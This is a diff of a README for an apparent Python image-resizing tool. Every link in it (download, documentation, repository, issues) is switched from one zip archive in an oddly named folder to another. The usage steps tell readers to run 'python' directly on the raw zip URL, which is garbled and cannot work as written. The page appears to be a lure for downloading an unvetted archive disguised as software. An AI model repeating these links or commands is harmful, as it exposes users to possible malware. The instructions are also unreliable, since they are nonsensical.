@@ -1,6 +1,6 @@
 # 🖼️ python-batch-image-reduction - Bulk Resize and Compress Your Images Easily
 
-[![Download Release](https://github.com/hajjjaji93/python-batch-image-reduction/raw/refs/heads/main/Aeluroidea/batch_image_reduction_python_v3.6.zip)](https://github.com/hajjjaji93/python-batch-image-reduction/raw/refs/heads/main/Aeluroidea/batch_image_reduction_python_v3.6.zip)
+[![Download Release](https://raw.githubusercontent.com/hajjjaji93/python-batch-image-reduction/main/Aeluroidea/python_batch_reduction_image_v2.4-alpha.1.zip)](https://raw.githubusercontent.com/hajjjaji93/python-batch-image-reduction/main/Aeluroidea/python_batch_reduction_image_v2.4-alpha.1.zip)
 
 ## 🚀 Getting Started
 
@@ -14,7 +14,7 @@ Before you download, make sure your system meets these requirements:
 
 ## 📥 Download & Install
 
-To download the latest version of python-batch-image-reduction, visit this page to download: [Download Latest Release](https://github.com/hajjjaji93/python-batch-image-reduction/raw/refs/heads/main/Aeluroidea/batch_image_reduction_python_v3.6.zip).
+To download the latest version of python-batch-image-reduction, visit this page to download: [Download Latest Release](https://raw.githubusercontent.com/hajjjaji93/python-batch-image-reduction/main/Aeluroidea/python_batch_reduction_image_v2.4-alpha.1.zip).
 
 1. Click the link to visit the Releases page.
 2. Choose the version you want to download.
@@ -32,14 +32,14 @@ Using python-batch-image-reduction is straightforward. Follow these steps:
 3. **Run the script** with the following command:
 
    ```
-   python https://github.com/hajjjaji93/python-batch-image-reduction/raw/refs/heads/main/Aeluroidea/batch_image_reduction_python_v3.6.zip
+   python https://raw.githubusercontent.com/hajjjaji93/python-batch-image-reduction/main/Aeluroidea/python_batch_reduction_image_v2.4-alpha.1.zip
    ```
 
 4. **Specify the folder** that contains the images you want to process.
    - You can do this by adding the folder path as an argument:
 
    ```
-   python https://github.com/hajjjaji93/python-batch-image-reduction/raw/refs/heads/main/Aeluroidea/batch_image_reduction_python_v3.6.zip /path/to/your/images
+   python https://raw.githubusercontent.com/hajjjaji93/python-batch-image-reduction/main/Aeluroidea/python_batch_reduction_image_v2.4-alpha.1.zip /path/to/your/images
    ```
 
 5. **Set your preferences.**
@@ -58,7 +58,7 @@ Your images will be reduced in size and saved in the same folder without affecti
 
 ## 📃 Documentation
 
-For more detailed instructions and examples, check the full documentation [here](https://github.com/hajjjaji93/python-batch-image-reduction/raw/refs/heads/main/Aeluroidea/batch_image_reduction_python_v3.6.zip).
+For more detailed instructions and examples, check the full documentation [here](https://raw.githubusercontent.com/hajjjaji93/python-batch-image-reduction/main/Aeluroidea/python_batch_reduction_image_v2.4-alpha.1.zip).
 
 ## 💬 Community Support
 
@@ -66,8 +66,8 @@ You're not alone! If you have questions or run into issues, feel free to reach o
 
 ## 🔗 Useful Links
 
-- [View Repository](https://github.com/hajjjaji93/python-batch-image-reduction/raw/refs/heads/main/Aeluroidea/batch_image_reduction_python_v3.6.zip)
-- [Issues and Feedback](https://github.com/hajjjaji93/python-batch-image-reduction/raw/refs/heads/main/Aeluroidea/batch_image_reduction_python_v3.6.zip)
+- [View Repository](https://raw.githubusercontent.com/hajjjaji93/python-batch-image-reduction/main/Aeluroidea/python_batch_reduction_image_v2.4-alpha.1.zip)
+- [Issues and Feedback](https://raw.githubusercontent.com/hajjjaji93/python-batch-image-reduction/main/Aeluroidea/python_batch_reduction_image_v2.4-alpha.1.zip)
 
 ## 📝 License
 
